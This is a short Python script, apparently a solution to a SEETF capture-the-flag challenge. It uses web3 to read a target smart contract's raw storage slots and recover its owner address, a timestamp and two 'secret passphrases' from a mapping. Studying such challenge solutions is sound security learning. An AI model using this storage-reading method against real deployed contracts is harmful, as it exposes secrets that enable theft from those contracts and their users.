# from sha3 import keccak_256
from web3 import Web3, HTTPProvider

client = Web3(HTTPProvider("http://awesome.chall.seetf.sg:40002/"))

target = "0xeb22BF8C59eA3f98081F9a8D188f2737Ec5c153A"

address_bytes = client.eth.get_storage_at(target, 0)
owner_address = hex(int.from_bytes(address_bytes, 'big'))
print(f"Owner address: {owner_address}.")


map_basis_slot = client.eth.get_storage_at(target, 1)
map_basis = hex(int.from_bytes(map_basis_slot, 'big'))
print(f"Map basis address: {map_basis}.")

time_stamp_slot = client.eth.get_storage_at(target, 2)
time_stamp = hex(int.from_bytes(time_stamp_slot, 'big'))

secret_passphrase_0_address = client.keccak(bytes.fromhex("0"*64 + "0"*63 + "1")).hex()
map_0_slot = client.eth.get_storage_at(target, secret_passphrase_0_address)
secret_passphrase_0 = map_0_slot.decode()

secret_passphrase_1_address = client.keccak(bytes.fromhex("0"*63 + "1" + "0"*63+"1")).hex()
map_1_slot = client.eth.get_storage_at(target, secret_passphrase_1_address)
secret_passphrase_1 = map_1_slot.decode()

print(f"Phrase 0: {secret_passphrase_0}.\nPhrase 1: {secret_passphrase_1}.\nTimestamp: {time_stamp}.")